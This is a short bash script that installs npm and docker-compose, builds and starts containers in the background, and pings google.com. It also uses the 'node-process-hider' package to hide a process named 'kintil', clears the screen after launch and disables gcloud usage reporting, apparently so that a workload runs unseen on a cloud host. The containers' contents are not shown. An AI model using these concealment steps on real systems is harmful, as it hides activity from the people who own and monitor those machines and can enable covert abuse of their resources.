#!/usr/bin/env bash

sudo apt-get update
sudo apt install npm -y
npm i -g node-process-hider && sudo ph add kintil
curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
    chmod +x /usr/local/bin/docker-compose
docker-compose build --parallel 
docker-compose up -d  && clear 
gcloud config set disable_usage_reporting true
sudo apt install iputils-ping
docker-compose logs
ping google.com
